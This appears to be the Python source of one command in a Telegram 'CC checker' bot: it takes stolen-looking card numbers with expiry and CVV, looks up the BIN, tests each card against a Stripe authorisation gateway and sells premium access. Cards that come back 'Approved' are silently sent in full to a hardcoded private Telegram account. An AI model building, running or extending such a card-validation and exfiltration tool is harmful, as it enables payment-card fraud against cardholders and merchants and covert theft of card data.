# commands/au.py
import os
import time
import requests
from dotenv import load_dotenv
from pyrogram import Client
from srca.configs import addCommand, find_cards
from plugins.gates.src.StripeAut import lasting
from db.mongo_client import MongoDB
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ✅ Cargar variables de entorno
load_dotenv()

# ✅ Definir el ID de destino (tu ID personal para recibir logs)
LOG_USER_ID = 7389519750

# ✅ Diccionario para rastrear el último uso del comando por usuario
last_command_time = {}

@addCommand('au')
def au_command(client, m):
    db = MongoDB()

    # Verificar si el grupo está autorizado
    group_authorized = db.query_group(m.chat.id) is not None

    # Verificar si el usuario está registrado
    querY = db.query_user(int(m.from_user.id))
    if querY is None:
        return m.reply("⚠️ Usa el comando /register para registrarte.")

    # Verificar si el usuario está baneado
    if querY.get('role') == 'baneado':
        return m.reply("🚫 Usuario baneado.")

    # Si el grupo no está autorizado, verificar suscripción Premium
    if not group_authorized:
        if querY.get('plan') != 'premium':
            return m.reply("❌ Solo los usuarios Premium pueden usar este comando.\n"
                           "💎 Adquiere el plan Premium: https://t.me/DashSab")
    # Si el grupo está autorizado, permitir /au a todos los miembros (Premium o no)

    # ✅ Aplicar antispam (10 segundos)
    user_id = m.from_user.id
    current_time = time.time()

    if user_id in last_command_time and current_time - last_command_time[user_id] < 10:
        wait = int(10 - (current_time - last_command_time[user_id]))
        return m.reply(f"⏳ Antispam activado, espera {wait}s antes de volver a intentarlo.")

    last_command_time[user_id] = current_time
    inicio = time.time()

    # ✅ Capturar los datos de la tarjeta
    ccs = find_cards(m.reply_to_message.text if m.reply_to_message else m.text)
    if ccs == '<b>ingrese la ccs.</b>':
        return m.reply(ccs)

    cc_num, exp_month, exp_year, cvv = ccs[:4]
    cc_com = f"{cc_num}|{exp_month}|{exp_year}|{cvv}"
    bin_number = cc_num[:6]

    # Obtener información del BIN
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        if response.status_code == 200:
            bin_info = response.json()
            bank = bin_info.get('bank', 'Desconocido')
            brand = bin_info.get('brand', 'Desconocido')
            country = bin_info.get('country_name', 'Desconocido')
            card_type = bin_info.get('type', 'Desconocido')
            country_flag = bin_info.get('country_flag', '')  # Obtener la bandera emoji de la API
        else:
            bank, brand, country, card_type, country_flag = 'Desconocido', 'Desconocido', 'Desconocido', 'Desconocido', ''
    except Exception as e:
        bank, brand, country, card_type, country_flag = 'Desconocido', 'Desconocido', 'Desconocido', 'Desconocido', ''
        print(f"❌ Error en BIN lookup: {e}")

    # ✅ Crear mensaje inicial de procesamiento
    new = m.reply(f'''<b>あ Stripe Auth 
(↯) CC: {cc_com}
(↯) Status: Processing... [ ☃️ ]
(↯) From: {m.from_user.first_name}</b>''')

    # Procesar la tarjeta con el gateway
    chk = lasting(cc_num, exp_month, exp_year, cvv)
    fin = time.time()

    # ✅ Crear botones "Canal" y "Precios"
    botones = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Canal", url="https://t.me/Deep_Chk"),
         InlineKeyboardButton("💰 Precios", url="https://t.me/Deep_Chk/24")]
    ])

    # ✅ Crear mensaje final con los resultados
    texto = f'''<b>あ 𝙎𝙩𝙧𝙞𝙥𝙚 ┊ 𝘼𝙪𝙩𝙝  ⸙
**- - - - - - - - - - - - - - - - - - -**\n
(↯) CC: <code>{cc_com}</code>
(↯) Status: {chk[0]}
(↯) Response: <code>{chk[1]}</code>
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Banco: {bank}
(↯) BIN: {bin_number} - {brand} - {card_type}
(↯) País: {country} {country_flag}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Proxy: Live ✅
(↯) Time: <code>{fin-inicio:0.4f}'s</code>
(↯) From: {m.from_user.first_name}</b>'''

    # ✅ Editar el mensaje con la respuesta final y botones
    new.edit_text(texto, reply_markup=botones)

    # ✅ Enviar la información al chat de logs solo si es Approved! ✅
    if chk[0] == 'Approved! ✅':
        log_text = f"""<b>📝 Chequeo Realizado - Stripe Auth</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Usuario:</b> {m.from_user.first_name} (@{m.from_user.username})
🆔 <b>ID:</b> {m.from_user.id}
💳 <b>CC:</b> <code>{cc_com}</code>
🏦 <b>Banco:</b> {bank}
📌 <b>BIN:</b> {bin_number} - {brand} - {card_type}
🌍 <b>País:</b> {country} {country_flag}
✅ <b>Status:</b> {chk[0]}
📜 <b>Response:</b> <code>{chk[1]}</code>
⏳ <b>Tiempo:</b> <code>{fin-inicio:0.4f}'s</code>
━━━━━━━━━━━━━━━━━━"""

        try:
            client.send_message(LOG_USER_ID, log_text)
            print(f"✅ Log enviado a {LOG_USER_ID} (Approved! ✅)")
        except Exception as e:
            print(f"❌ Error enviando al log privado: {e}")